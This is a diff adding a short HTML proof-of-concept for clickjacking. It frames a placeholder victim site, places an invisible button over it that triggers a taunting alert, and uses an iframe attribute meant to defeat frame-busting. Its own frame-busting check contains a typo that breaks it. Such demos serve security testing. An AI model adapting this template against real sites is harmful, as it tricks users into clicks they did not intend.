@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Clickjacking Example</title>
+  <style>
+    iframe {
+      width: 1500px;
+      height: 1500px;
+      position: absolute;
+      top: 0;
+      left: 0;
+      opacity: 1;
+      z-index: -1; /* Updated z-index to send iframe to the background */
+    }
+
+    #myButton {
+      position: absolute;
+      top: 225px;
+      left: 1250px;
+      opacity: 0; /* Hide the button */
+    }
+  </style>
+  <script>
+    function showAlert() {
+      alert("broken owns ur javascripts!");
+    }
+	if(top.location!=self.locaton) {
+    parent.location = self.location;
+}
+  </script>
+</head>
+<body>
+  <div></div>
+
+  <!-- The URL from the victim site -->
+  <iframe src="https://example.com" width="1000" height="1000" security="restricted"></iframe>
+
+  <button id="myButton" onclick="showAlert()">Click here!</button>
+
+  <div></div>
+</body>
+</html>
